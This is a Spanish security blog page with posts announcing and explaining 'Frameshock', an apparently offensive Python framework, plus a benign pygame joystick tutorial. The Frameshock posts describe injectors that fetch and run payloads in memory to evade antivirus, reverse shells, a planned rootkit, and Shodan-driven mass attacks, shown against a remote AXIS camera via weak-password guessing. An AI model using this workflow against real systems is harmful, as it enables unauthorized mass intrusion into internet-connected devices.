Banner de Sponsor oficial o un agradecimiento, ambos tipos de referencia contendrán, de querer el autor, un hipervinculo a su sitio web.&nbsp;</div><div style="text-align: left;"><br /></div><div style="text-align: left;">El referenciado podrá elegir si quiere ser mencionado bajo su nombre real o su seudónimo.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">La mención especial de hoy se la lleva <b>Imparable Fenix</b>, gracias de todo corazón por colaborar con la compra del dominio <b>securitysignal.org</b>.</div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/02/03/frameshock-al-descubierto/">Frameshock Al Descubierto!</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-02-03T12:19:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://4.bp.blogspot.com/-P9Scx1bAufw/VNEsZyzz7PI/AAAAAAAAAS4/rzEpDsGvBcY/s1600/main.png" height="300" onclick="zoomToggle('640px','300px','100%','100%',this);" width="640" /></div><div class="separator" style="clear: both; text-align: right;"><b>&nbsp;by hdbreaker</b></div><div class="separator" style="clear: both; text-align: right;"><br /></div>Antes que nada quiero agradecer a la comunidad que me ha ido reportando pequeños bugs de inestabilidad sobre el framework, los cuales<br /><a name='more'></a>he ido fixeando constantemente, a todos ellos les agradezco y los invito a descargar la ultima versión de su repositorio oficial:<br /><br /><a href="https://bitbucket.org/hdbreaker/frameshock">https://bitbucket.org/hdbreaker/frameshock</a><br /><br />Si aun no sabes lo que es Frameshock, te invito a pasar y conocer mas sobre este proyecto:<br /><a href="http://www.securitysignal.tk/2015/02/frameshock-v-10.html">http://www.securitysignal.tk/2015/02/frameshock-v-10.html</a><br /><br />Les recuerdo que el framework esta en fase BETA, en este momento solo es soportado por distribuciones Linux derivadas de Debian y esta en constante desarrollo, por lo que pido que todo aquel que haya identificado un error, actualice a la ultima versión del repositorio y confirme si el mismo sigue vigente.<br /><div style="text-align: right;"><br /><b>En fin, un millón&nbsp; de gracias por colaborar!</b></div><div style="text-align: right;"><br /><div style="text-align: left;"><br /></div></div><div class="separator" style="clear: both; text-align: left;">En esta entrada quiero presentar una pequeña guía para explicar el funcionamiento de Frameshock y solventar dudas en su utilización.</div><div class="separator" style="clear: both; text-align: left;"></div><div class="separator" style="clear: both; text-align: left;"></div><div class="separator" style="clear: both; text-align: left;"></div><div class="separator" style="clear: both; text-align: left;"><br /></div>Lo primero a resaltar es que todo aquel que haya utilizado alguna vez Metasploit no encontrara mayores problemas al familiarizarse con Frameshock, ya que hemos decidido seguir la linea de interacción de msf con el usuario para facilitar la migración y evitar las complicaciones sintácticas que implica una nueva forma de trabajo.<br /><br />Frameshock se divide en 4 grande partes:<br /><br /><div class="separator" style="clear: both; text-align: left;">[*] El Main</div><div class="separator" style="clear: both; text-align: left;">[*] El Payload</div>[*] El Handler<br />[*] Los Modulos<br /><b> </b><br /><div style="text-align: center;"><h2>El Main</h2><h2><img border="0" src="http://2.bp.blogspot.com/-5yVgFTxNm1U/VNEgsPuJijI/AAAAAAAAARo/SOjZQw8jkdY/s1600/main.png" height="277" onclick="zoomToggle('400px','277px','100%','100%',this);" width="400" /> </h2><div style="text-align: left;">Este es el cuerpo principal del Framework, en el encontraremos todas las utilidades de configuración para el correcto funcionamiento del mismo, las opciones de configuración de los payloads, la posibilidad de acceder al MultiHander de Frameshock así también como a la opción de búsquedas con el motor de SHODAN y todas las modificaciones a la base de datos que esto representa.</div></div><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;">Lo importante a tratar en Frameshock, es que a diferencia de Metasploit las opciones de configuración del framework son globales, lo que nos permite acceder a las mismas desde módulos subyacentes brindado una excesiva flexibilidad al momento de desarrollar. </div><br />Los Payload en Frameshock también son globales así también las búsquedas de SHODAN, permitiéndonos rápidamente realizar múltiples ataques y reconfiguraciones veloces sin necesidad de modificar nada dentro del modulo que estamos operando ni de las Sesiones obtenidas.<br /><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;">Frameshock sigue esta linea de pensamiento:</div><br />1) Elige el payload a utilizar..<br /><div class="separator" style="clear: both; text-align: left;">2) Inicia el Manejador de Sesiones.</div><div class="separator" style="clear: both; text-align: left;">3) Selecciona un Modulo y Ataca.</div><h2 class="separator" style="clear: both; text-align: center;">El Payload&nbsp;&nbsp;</h2><h2 class="separator" style="clear: both; text-align: center;"><img border="0" src="http://4.bp.blogspot.com/-QZf-MZni-Sg/VNEgtQ0uFtI/AAAAAAAAARw/wTQKBPH1784/s1600/payload.png" height="132" onclick="zoomToggle('400px','132px','100%','100%',this);" width="400" /></h2><div class="separator" style="clear: both; text-align: left;">A diferencia de Mestasploit, Frameshock ofrece solo 5 posibles Payloads.</div><div class="separator" style="clear: both; text-align: left;"><br /></div>Cada uno cumple todas las necesidades que puede requerir un pentester dependiendo del sistema que va a atacar. <br /><br />Los payloads mas potentes de Frameshock están programados en python, dando una dependencia de la maquina víctima con el interprete.<br /><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;">Esto fue solventado en linux, dando la posibilidad de generar 2 Payloads que dependen directamente de las Shells interactivas del sistema. Dado que algunos sistemas basados en ARM/IoT solo presentan /bin/sh creamos 2 payload que nos permiten gestionar Reverse Shell tanto en BASH como SH.</div><br /><b>La verdad es que todavía para atacar a maquinas Windows de forma eficiente nos encontramos desarrollando un payload en C/C++</b> pero por el momento se puede pasar el payload por Py2Exe para generar un ejecutable compilado y lograr realizar el ataque correctamente. Aunque siempre esta la posibilidad de atacar servidores <b>Windows</b> con <b>PowerShell</b> que incluyen Python por defecto.<br /><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;">Dentro de los Payload tenemos 3 formas distintas de Funcionamiento.</div><br /><b>Los Python Payloads:</b><br /><br />Main Frameshock al seleccionar un Payload, genera un injector.py, el mismo se encuentra dentro de la carpeta del proyecto /Injector y a su vez es copiado dentro del directorio <b>/Injector</b> dentro la ruta definida por el usuario de Apache (/var/www en nuestro caso)<br /><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;"><span style="color: red;">/var/www/Injector/injector.py</span> #Esto nos permite acceder al payload de forma remota por medio de wget luego de la explotación de la vulnerabilidad.</div><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;">injector.py es un pequeño código que se encarga de solicitarle al <b>Handler</b> el verdadero Payload para luego ejecutarlo <span style="color: red;">On The Fly</span>, evitando detecciones de Antivirus y realizando un mínimo trafico hacia internet .</div><br /><b>Diagrama:</b><br /><br />Victima (injector.py) --------------<span style="color: red;">GiveMePayload</span>----------&gt; Atacante Handler<br /><div class="separator" style="clear: both; text-align: left;">Victima (injector.py) &lt;-------------------<span style="color: red;">Payload</span>----------------- Atacante Handler</div>Victima (<span style="color: red;">Payload On Memory</span>) ------<span style="color: red;">Reverse Shell</span>-----&gt; Atacante Handler<br /><br /><div class="separator" style="clear: both; text-align: left;"><b>Los Shell Payloads:</b></div><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;">Main  Frameshock&nbsp; genera injector.sh o injector.bash, el mismo se  encuentra dentro de la carpeta del proyecto /Injector y a su vez es  copiado dentro del directorio <b>/Injector</b> dentro la ruta definida por el  usuario de Apache (/var/www en nuestro caso)</div><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;"><span style="color: red;">/var/www/Injector/injector.sh || </span><span style="color: red;">/var/www/Injector/injector.bash</span> #Esto nos permite acceder al payload de forma remota por medio de wget luego de la explotación de la vulnerabilidad.</div><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;">En este caso Injector.sh o Injector.bash, retorna por medio de métodos especificos una shell interactiva directamente sin solicitar Payload al Handler.</div><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;"><b>El Meterpreter Payload:</b></div><div class="separator" style="clear: both; text-align: left;"><br /></div>Main  Frameshock al seleccionar un Payload, genera un injector.py, el mismo se  encuentra dentro de la carpeta del proyecto /Injector y a su vez es  copiado dentro del directorio <b>/Injector</b> dentro la ruta definida por el usuario de Apache (/var/www en nuestro caso)<br /><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;"><span style="color: red;">/var/www/Injector/injector.py</span> #Esto nos permite acceder al payload de forma remota por medio de wget luego de la explotación de la vulnerabilidad.</div><div class="separator" style="clear: both; text-align: left;"><br /></div><span style="color: red;">injector.py</span> es un pequeño código que se encarga de solicitarle al Payload correspondiente a <b>Metasploit Multi/Handler</b>, el cual posteriormente ejecuta <span style="color: red;">On The Fly</span> y devuelve una Meterpreter Session.<br /><br /><h2 style="text-align: center;">El Handler</h2><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://2.bp.blogspot.com/-SSiIFM3cRjY/VNEe60rwwuI/AAAAAAAAARc/o-Gng23L-c4/s1600/handler.png" height="334" onclick="zoomToggle('640px','334px','100%','100%',this);" width="640" /></div><div class="separator" style="clear: both; text-align: left;"><br /></div>El Handler se inicia desde el Main Menu ejecutando <b>start handler</b>, este es totalmente independiente y nos permite gestionar todos los tipos de Sesiones entregadas por los payloads, a excepción de Meterpreter, que es gestionado por Metasploit y depende de su previa instalación.<br /><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;">Frameshock Handler, se comporta de 2 formas distintas dependiendo del indentificador enviado por el payload. </div><br />El mismo integra un Payload Manager encargado de enviar los Payload a los Injectors correspondientes y un Session Manager, encargado de gestionar de forma MultiThreading y Asincronica una ilimitada cantidad de Sesiones al mismo tiempo, permitiendo interactuar y volver a background a las Sesiones en cualquier momento por medio de los comandos <b>interact</b> y <b>stop</b>. Se espera en su proxima versión que sea capas de instalar un rootkit en los equipos deseados como modulo para mantener el acceso.<br /><br />En la siguiente imagen se puede apreciar, como un injector.py solicita un payload al hanler y luego de su ejecución en memoria nos devuelve una Reverse Shell con la cual podemos interactuar en cualquier momento<br /><br /><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://1.bp.blogspot.com/-txH0K37pNZc/VNEjUwIe9qI/AAAAAAAAAR8/hPpsadSCa9I/s1600/session.png" height="376" onclick="zoomToggle('640px','376px','100%','100%',this);" width="640" /></div><div style="text-align: center;"><h2>Los Modulos</h2></div><div style="text-align: left;">Los Modulos desarrollados por la  comunidad se encuentran en ExtraModules y deben seleccionarse y copiarse  dentro de la carpeta Modules, respentando la nomenclatura y el  correspondiente identificador numérico acorde a la cantidad de modulos  presentes en la carpeta.&nbsp;</div><div style="text-align: left;"></div><div style="text-align: left;">Una vez hecho esto, podremos interactuar con los módulos seleccionados desde Frameshock con los comandos <b>show modules</b> y <b>use {ModuleNumber}</b>&nbsp;</div><div style="text-align: left;"></div><div style="text-align: left;"><span style="color: red;"><b>Importante: **** Antes de realizar el ataque con un modulo, debemos asegurarnos de haber creado un payload y haber iniciado el Handler ***</b></span>&nbsp; </div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-wy8rUlNVcQc/VNEls3T-PbI/AAAAAAAAASI/I9xATdwRkXY/s1600/module.png" height="286" onclick="zoomToggle('400px','286px','100%','100%',this);" width="400" /></div><div style="text-align: left;"><br />Una vez seleccionado un modulo, podemos visualizar sus opciones internas para adaptarlo a nuestras necesidades con el comando comando <b>help</b><br /><br />Cabe desatacar que cada desarrollador puede adaptar las propiedades internas de sus módulos acorde a sus necesidades, Frameshock propone una estructura base que ha de respetarse para sacar el maximo provecho del framework.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Entre las opciones por defecto de los modulos se expresa la función:&nbsp; <b>use shodan</b> la cual carga como targets todos dispositivos obtenidos al utilizar la búsqueda por SHODAN en el Main Menu de Frameshock, permitiéndonos automatizar ataques masivos de forma sencilla y veloz.</div><div style="text-align: left;"><br />En el ejemplo a tratar en este manual se atacara a una Camara AXIS remota, vulnerable al modulo AXISIntruder desarrollado por [Q]3rv[0], el cual prueba contraseñas débiles en estos dispositivos, una vez logrado acceso sube el Payload y en unos segundos nos retorna una shell dentro del pequeño sistema interno de estos dispositivos.<br /><br />Cabe destacar que las cámaras AXIS ARM solo disponen de <b>/bin/sh</b>, por lo que nuestro payload deber ser acorde al ataque a realizar.</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://4.bp.blogspot.com/-DHihCvlVyhg/VNEojAm1yoI/AAAAAAAAASU/qC4dUVnvSto/s1600/sh.png" height="151" onclick="zoomToggle('400px','151px','100%','100%',this);" width="400" /></div><div style="text-align: left;"></div><div style="text-align: left;"><br />Iniciamos el Handler:<br /><br /><div style="text-align: center;"><img border="0" src="http://2.bp.blogspot.com/-SSiIFM3cRjY/VNEe60rwwuI/AAAAAAAAARc/o-Gng23L-c4/s1600/handler.png" height="334" onclick="zoomToggle('640px','334px','100%','100%',this);" width="640" /></div></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Seleccionamos el Modulo:</div><div style="text-align: left;"><br /></div><div style="text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-wy8rUlNVcQc/VNEls3T-PbI/AAAAAAAAASI/I9xATdwRkXY/s1600/module.png" height="286" onclick="zoomToggle('400px','286px','100%','100%',this);" width="400" /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Configuramos un Target Manual:</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://3.bp.blogspot.com/-QgmUq6DHo48/VNEpMaTj66I/AAAAAAAAASc/hYde9EDMS6E/s1600/target.png" height="36" onclick="zoomToggle('400px','36px','100%','100%',this);" width="400" />&nbsp;</div><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: left;">Ejecutamos el Ataque:</div><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://1.bp.blogspot.com/--kiiqR-A8A8/VNErafetHSI/AAAAAAAAASo/n_lCTpnzYvQ/s1600/exploit.png" height="78" onclick="zoomToggle('640px','78px','100%','100%',this);" width="640" /></div><div class="separator" style="clear: both; text-align: left;"><br /></div>Esperamos unos segundos, y vemos como nuestro handler maneja la Sesión:<br /><div class="separator" style="clear: both; text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><img border="0" src="http://2.bp.blogspot.com/-bDsjKJTock8/VNEroaRCRTI/AAAAAAAAASw/ILVnaW0k_lw/s1600/victim.png" height="574" onclick="zoomToggle('640px','574px','100%','100%',this);" width="640" /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Espero que esta guía solvente muchas de sus dudas, que les sea de utilidad y por sobretodo gracias por ayudarnos a volver realidad este gran proyecto!</div><div class="separator" style="clear: both; text-align: left;"></div><div class="separator" style="clear: both; text-align: left;"></div><div style="text-align: right;"><br />Saludos!</div><div class="separator" style="clear: both; text-align: left;"><br /></div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/02/02/frameshock-v-10/">Frameshock</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-02-02T22:35:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://riaus.org.au/wp-content/uploads/2012/03/FRS_Behind-the-shock-machine.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://riaus.org.au/wp-content/uploads/2012/03/FRS_Behind-the-shock-machine.jpg" height="333" width="400" /></a></div><div style="text-align: right;"><b>by hdbreaker</b><br /><b><br /></b></div><div style="text-align: left;">Hoy quiero compartir con toda la comunidad un importante lanzamiento de nuestro equipo, luego de varios meses de desarrollo y testing tenemos las<br /><a name='more'></a>primeras versiones estables y 100% funcionales de una idea que nació al no sentirnos identificado al 100% con Metasploit.<br /><br />Alguna vez te has preguntado... Realmente cuantos módulos de <b>Metasploit</b> son actualmente <b>funcionales</b>? <b>Cuanto tiempo dura</b> un modulo funcional? Framework <b>lento</b>?&nbsp; Demasía de módulos,<b> ruido</b> <b>visual</b>, y un buscador algo <b>limitado</b>? Por que <b>Ruby</b> y no <b>Python</b>? <b>Inestabilidad</b> en las Sesiones fuera de la LAN? <br /><br />La principal queja de muchos, es que el framework fomenta la aparición constante de Script Kiddies que cargan msf y atacan sin entender que están haciendo.<br /><br />La verdad es que estas son algunas de las preguntas que muchos de la comunidad nos hacemos, por mi parte creo que el equipo de Metasploit ha logrado un excelente trabajo, pero tengo que resaltar algunos problemas:<br /><br />[*] Gran cantidad de Script Kiddies a la espera de un nuevos 0day<br />[*] Inestabilidad en las Sesiones<br />[*] Mucho ruido visual<br />[*] Framework lento<br /><br />y algo por lo que no quiero entrar en discusión... <b>¿POR QUE RUBY?</b><br /><br />Ruby y Python me parece excelentes lenguajes de programación, por mi parte considero una mayor facilidad de introducir a los nuevos adeptos de la mano de Python. Y creo que con Ruby se dejo de lado a grandes mentes "Pythonicas" y una gran cantidad de material sobre el desarrollo de Exploits en Python<br /><div style="text-align: center;"><br /><b>Un mal concepto de Framework?</b></div><br />Un Framework realmente es una base robusta, modular, limpia y pura que nos dota de una fuerte cantidad de herramientas para el desarrollo de nuestros propios módulos.<br /><b></b><br /><b><br /></b><br /><div style="text-align: center;"><b>Que es Frameshock? que me ofrece? por que debería probarlo?</b></div><br />Frameshock <span data-ft="{&quot;tn&quot;:&quot;K&quot;}" data-reactid=".18g.1:3:1:$comment855715964467759_855736757799013:0.0.$right.0.$left.0.0.1:$comment-body"><span class="UFICommentBody" data-reactid=".18g.1:3:1:$comment855715964467759_855736757799013:0.0.$right.0.$left.0.0.1:$comment-body.0"><span data-reactid=".18g.1:3:1:$comment855715964467759_855736757799013:0.0.$right.0.$left.0.0.1:$comment-body.0.$end:0:$0:0">propone una base robusta y solida para desarrollar o portar viejo código en módulos</span></span></span> de forma limpia, clara y pura.&nbsp;<span data-ft="{&quot;tn&quot;:&quot;K&quot;}" data-reactid=".18g.1:3:1:$comment855715964467759_855736757799013:0.0.$right.0.$left.0.0.1:$comment-body"><span class="UFICommentBody" data-reactid=".18g.1:3:1:$comment855715964467759_855736757799013:0.0.$right.0.$left.0.0.1:$comment-body.0"><span data-reactid=".18g.1:3:1:$comment855715964467759_855736757799013:0.0.$right.0.$left.0.0.1:$comment-body.0.$end:0:$0:0"> Incluye distintos payloads y un handler MultiThreading que nos permite interactuar con multiples víctimas al mismo tiempo de forma estable segura y pensado 100% en ataques fuera de la LAN<br /><br />Frameshock viene de la mano con la filosofía "<b>Pick and Drop"</b>, <b>eres desarrollador?</b> <b>has creado tus propios módulos?</b>, simplemente <b>comparte!</b> estos se integraran automáticamente al framework con tan solo arrastrar el modulo dentro de la carpeta <b>"Modules"</b>. <b>Crea tu armamento personalizado</b>, selecciona lo <b>justo y necesario</b>, sin cantidad de módulos que no utilizas y <b>sin perdidas de tiempo</b> antes de realizar un ataque, y lo mas importante... <b>Do it Your Self!!!</b></span></span></span><br /><span data-ft="{&quot;tn&quot;:&quot;K&quot;}" data-reactid=".18g.1:3:1:$comment855715964467759_855736757799013:0.0.$right.0.$left.0.0.1:$comment-body"><span class="UFICommentBody" data-reactid=".18g.1:3:1:$comment855715964467759_855736757799013:0.0.$right.0.$left.0.0.1:$comment-body.0"><span data-reactid=".18g.1:3:1:$comment855715964467759_855736757799013:0.0.$right.0.$left.0.0.1:$comment-body.0.$end:0:$0:0"><br /></span></span></span><span data-ft="{&quot;tn&quot;:&quot;K&quot;}" data-reactid=".18g.1:3:1:$comment855715964467759_855736757799013:0.0.$right.0.$left.0.0.1:$comment-body"><span class="UFICommentBody" data-reactid=".18g.1:3:1:$comment855715964467759_855736757799013:0.0.$right.0.$left.0.0.1:$comment-body.0"><span data-reactid=".18g.1:3:1:$comment855715964467759_855736757799013:0.0.$right.0.$left.0.0.1:$comment-body.0.$end:0:$0:0">Una característica a resaltar de Frameshock es su integración con <b>Shodan</b> pensada </span></span></span>para <b>atacar multiples targets de forma rápida y simultanea</b> dando al pentester una excelente herramienta para automatizar ataques y realizar nuevas <b>pruebas de concepto masivas</b> potenciando por completo la capacidad de explotar un nuevo 0day.<br /><br /><div style="text-align: center;">&nbsp;<b>¿Lenguaje elegido?</b></div><div style="text-align: left;">Nuestro concepto de framework viene de la mano de Python, dando la oportunidad de <b>portar y reutilizar</b> gran cantidad de código programado por desarrolladores que eligieron este magnifico y <b>potente lenguaje</b> para el desarrollo de herramientas, dando la posibilidad a <b>usuarios menos experimentados</b> ingresar al mundo del <b>desarrollo de exploits</b> y la <b>automatización de procesos</b> de forma <b>rápida, practica y amigable</b>. De esta forma combatir a la creciente población de Script Kiddies, dando una herramienta <b>simple y profesional</b> para el desarrollo de módulos.<br /><b><br />Has tu trabajo y hazlo por ti mismo!</b> <b>aprende, sorprende y comparte con tus descubrimientos! &nbsp; </b></div><div style="text-align: center;"><br /></div><b>Frameshock</b> aun se encuentra en estado <b>BETA</b> por lo que puedes encontrar alguna <b>inestabilidad</b> en el sistema, pero ya puedes <b>descargar, probar y utilizar</b> los primeros módulos desarrollados por el equipo de Frameshock, <b>si quieres ayudar, desarrollar, reportar bugs, o compartir tus módulos</b> con la comunidad no dudes en ponerte en contacto!<br /><br /><span style="color: red;">Para los fanáticos de Metasploit, no hay de que preocuparse, Frameshock integra completamente Meterpreter y el modulo Muli/Handler de Metasploit.</span><br /><br />Repositorio: <a href="https://bitbucket.org/hdbreaker/frameshock/">https://bitbucket.org/hdbreaker/frameshock/</a><br />Email: <a href="mailto:hdbreaker96@gmail.com">hdbreaker96@gmail.com</a><br /><br /><div style="text-align: right;">Gracias por hacer esto posible, Saludos!</div></div><div style="text-align: right;"><br /></div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/02/02/joystick-analogico-pwm/">Joystick Analógico & PWM</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-02-02T20:34:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


  <div class="entry-content"><div class="separator" style="clear: both; text-align: center;"><a href="http://upload.wikimedia.org/wikipedia/commons/thumb/d/dc/Delta_PWM.svg/2000px-Delta_PWM.svg.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://upload.wikimedia.org/wikipedia/commons/thumb/d/dc/Delta_PWM.svg/2000px-Delta_PWM.svg.png" height="384" width="640" /></a></div><div style="text-align: left;"><div style="text-align: right;"><b>by hdbreaker</b></div><br />Esta entrada sigue con la serie de Robotica del blog, en la misma desarrollaremos una interfaz en python con la cual capturaremos los valores analógicos de las Axis de un Joystick USB para alimentar el Pulso Modulado de Ondas (PWM) de nuestro circuito y de esta forma lograr regular la velocidad de los motores a controlar.</div><div style="text-align: left;"><br />Para esto, nos ayudaremos de la muy conocida librería Pygame, pero distorsionando un poco la idea para la que fue creada, ya que no desarrollaremos un Vídeo Juego pero si utilizaremos el modulo <span style="color: red;"><b>pygame.joystick</b></span> para interactuar con el hardware.<br /><br />Lo importante de pygame es comprender como trata las pulsaciones:<br />En pygame, todo lo que sucede es un evento y cada evento tiene una clasificación, por lo que nosotros necesitaremos Iterar entre todos los eventos hasta identificar los que correspondan al movimiento de los AXIS del Joystick</div><div style="text-align: left;"></div><div style="text-align: left;"><br />para esto debemos obtener todos los eventos manejados por la librería, esto lo logramos con la siguiente función: <b>pygame.event.get()</b>resumiendo, nosotros iteraremos entre todos los eventos capturados por event.get() de la siguiente forma:</div><pre class="brush: py">for event in pygame.event.get(): # User did something<br />   if event.type == pygame.QUIT: # If user clicked close<br />      done=True # Flag that we are done so we exit this loop<br />   if event.type == pygame.JOYAXISMOTION:<br />       <br />       if(event.axis==1): #arriba y abajo stick izq<br />          #Capturamos el valor analógico<br />       if(event.axis==2): #izquierda y derecha stick derecho<br />          #Capturamos el valor analógico</pre><br /><span style="color: red;"><b>pygame.QUIT </b><span style="color: black;">corresponde al evento de salida en pygame (el boton de exit)</span></span><br /><span style="color: red;"><span style="color: black;"><span style="color: red;"><b>pygame.JOYAXISMOTION </b><span style="color: black;">corresponde al evento de movimiento de los sticks del joystick, lo importante a resaltar de este evento es que se subdivide en 4 valores enteros (1,0,3,2), los cuales representan <span style="color: red;"><b>Norte-Sur</b></span> y <b><span style="color: red;">Este-Oeste</span></b> del Análogo Izquierdo y derecho respectivamente: (Los números pares, representan el movimiento horizontal de los Análogos mientras que los impares el movimiento vertical)</span></span></span></span><b><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;">#Movimiento&nbsp; Vertical</span></span></span></span></b><br /><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;"><span style="color: red;">event.axis==1</span> <b>#Stick Izquierdo</b></span></span></span></span><br /><span style="color: red;"></span><br /><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;"><span style="color: red;">event.axis==3</span> <b>#Stick Derecho</b></span></span></span></span><br /><span style="color: red;"><span style="color: black;"><span style="color: red;"></span></span></span><br /><b><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;">#Movimiento Horizontal</span></span></span></span></b><br /><span style="color: red;"><span style="color: black;"><span style="color: red;"></span></span></span><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;"><span style="color: red;">event.axis==0</span> <b>#Stick Izquierdo</b></span></span></span></span></span></span></span></span><br /><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;"><span style="color: red;"></span></span></span></span></span></span></span><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;"><span style="color: red;">event.axis==2</span> <b>#Stick Derecho</b></span></span></span></span></span></span></span></span></span></span></span></span><br /><br />Teniendo en claro esto, solo nos queda capturar los valores que nos envía el hardware, teniendo en cuenta que el valor de reposo (centro) de los Análogos es 0 y la amplitud de movimiento es de punto decimal yendo desde&nbsp; 1 a -1<br /><br /><br /><b>#Valor Análogo Decimal</b><br /><span style="color: red;">-1</span> <b>#Arriba Maximo</b><br />&nbsp;<span style="color: red;">1</span> <b>#Abajo&nbsp; Maximo</b><br /><span style="color: red;"><span style="color: black;"><span style="color: red;"><span style="color: black;">&nbsp;&nbsp; </span></span></span></span><span style="color: red;"><span style="color: black;">&nbsp;</span></span><br /><span style="color: red;"><span style="color: black;"><span style="color: red;">-1</span> <b>#Izquierda Maximo</b><span style="color: red;">&nbsp;</span></span></span><br /><span style="color: red;"><span style="color: black;"><span style="color: red;">&nbsp;1</span> <b>#Derecha Maximo</b></span></span><br /><div style="text-align: left;"></div><div style="text-align: left;"><br />Comprendiendo esto se puede llegar al siguiente código para este proceso:<br /><br /><pre class="brush: py">import pygame<br /><br />pygame.init()<br />done = False<br /><br /># Initialize the joysticks<br />pygame.joystick.init()<br /><br /><br /># -------- Main Program Loop -----------<br />while done==False:<br /><br />    # Get count of joysticks<br />    joystick_count = pygame.joystick.get_count()<br /><br />    # For each joystick:<br />    for i in range(joystick_count):<br />        joystick = pygame.joystick.Joystick(i)<br />        joystick.init()<br /><br />        # Get the name from the OS for the controller/joystick<br />        name = joystick.get_name()<br /><br />        # Usually axis run in pairs, up/down for one, and left/right for<br />        # the other.<br />        axes = joystick.get_numaxes()<br />        #print axes<br />        flagAceleracion=0<br />        flagMov=0<br />        for event in pygame.event.get(): # User did something<br /><br />            if event.type == pygame.QUIT: # If user clicked close<br />                done=True # Flag that we are done so we exit this loop<br /><br />            if event.type == pygame.JOYAXISMOTION:<br />                 #arriba y abajo<br />                if(event.axis==1):<br />                    if(flagAceleracion==0):<br />                        print "Acelero"<br />                        axis = joystick.get_axis(1)<br />                        print axis * -10<br />                        flagAceleracion=1<br /><br />                    if(flagAceleracion==0):<br />                        print "Desacelero"<br />                        axis = joystick.get_axis(1)<br />                        print axis * -10<br />                        flagAceleracion=1<br /><br />                    if(event.value==0.0):<br />                        flagAceleracion=0<br /><br /><br />                #derecha y izq<br />                if(event.axis==2):<br /><br />                    if(flagMov==0):<br />                        print "Izquierda"<br />                        axis = joystick.get_axis(2)<br />                        print axis * 10<br />                        flagMov=1<br /><br />                    if(flagMov==0):<br />                        print "Derecha"<br />                        axis = joystick.get_axis(2)<br />                        print axis * 10<br />                        flagMov=1<br /><br />                    if(event.value==0.0):<br />                        flagMov=0<br /><br /><br />pygame.quit ()<br /></pre><br />En este ejemplo multiplico el valor de axis por 10 para obtener un numero entre 10 y -10 ya que estos valores me resultan mas cómodos para mi proyecto, para completar el código bastaría accionar los motores pasando como parámetro PWM el valor de la variable axis ya sea de forma local o por medio de sockets.<br /><br />Espero les sea de utilidad, para profundizar en el uso de pygame les comparto el link a su documentación oficial: <a href="http://pygame.org/docs/">http://pygame.org/docs/</a><br /><br /><div style="text-align: right;">Saludos!</div><br /><br /><br /></div></div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/01/22/object-tracking-system-opencv/">Object Tracking System OpenCV</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2015-01-22T17:05:00-08:00" pubdate data-updated="true"></time>
        
      </p>
    
  </header>


